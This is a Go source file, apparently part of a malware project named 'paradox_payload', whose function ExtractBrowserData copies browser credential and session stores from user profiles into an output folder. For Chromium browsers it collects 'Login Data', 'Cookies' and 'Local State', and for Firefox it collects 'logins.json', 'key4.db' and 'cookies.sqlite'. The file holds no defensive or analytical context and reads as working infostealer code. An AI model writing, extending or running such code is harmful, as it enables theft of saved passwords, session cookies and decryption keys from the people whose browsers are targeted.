package extraction

import (
	"fmt"
	"os"
	"path/filepath"

	"paradox_payload/discovery"
	"paradox_payload/fileops"
)

func ExtractBrowserData(profile discovery.FoundBrowserProfile, outputBaseDir string) error {
	fmt.Printf("  Extracting data for %s (%s): %s\n", profile.BrowserName, profile.Type, profile.Path)

	var targets []string
	switch profile.Type {
	case "Chromium":
		targets = []string{
			"Login Data",
			"History",
			"Web Data",
			"Cookies",
			filepath.Join("Network", "Cookies"),
			"Local State",
			"Local Storage",
			"Session Storage",
		}
	case "Gecko":
		targets = []string{
			"formhistory.sqlite",
			"logins.json",
			"cookies.sqlite",
			"places.sqlite",
			"key4.db",
		}
	default:
		return fmt.Errorf("unsupported browser type for extraction: %s", profile.Type)
	}

	profileName := filepath.Base(profile.Path)

	destDir := filepath.Join(outputBaseDir, profile.BrowserName, profileName)
	if err := os.MkdirAll(destDir, 0755); err != nil {
		return fmt.Errorf("failed to create output directory %s: %w", destDir, err)
	}

	extractionErrors := 0
	for _, target := range targets {
		srcPath := filepath.Join(profile.Path, target)
		dstPath := filepath.Join(destDir, target)

		srcInfo, err := os.Stat(srcPath)
		if err != nil {
			if os.IsNotExist(err) {
				continue
			}
			fmt.Printf("    Error stating source target %s: %v\n", srcPath, err)
			extractionErrors++
			continue
		}

		if srcInfo.IsDir() {
			if err := fileops.CopyDir(srcPath, dstPath); err != nil {
				fmt.Printf("    Error copying directory %s: %v\n", srcPath, err)
				extractionErrors++
			}
		} else {
			if err := fileops.CopyFile(srcPath, dstPath); err != nil {
				fmt.Printf("    Error copying file %s: %v\n", srcPath, err)
				extractionErrors++
			}
		}
	}

	if extractionErrors > 0 {
		return fmt.Errorf("completed extraction for %s/%s with %d errors", profile.BrowserName, profileName, extractionErrors)
	}

	return nil
}
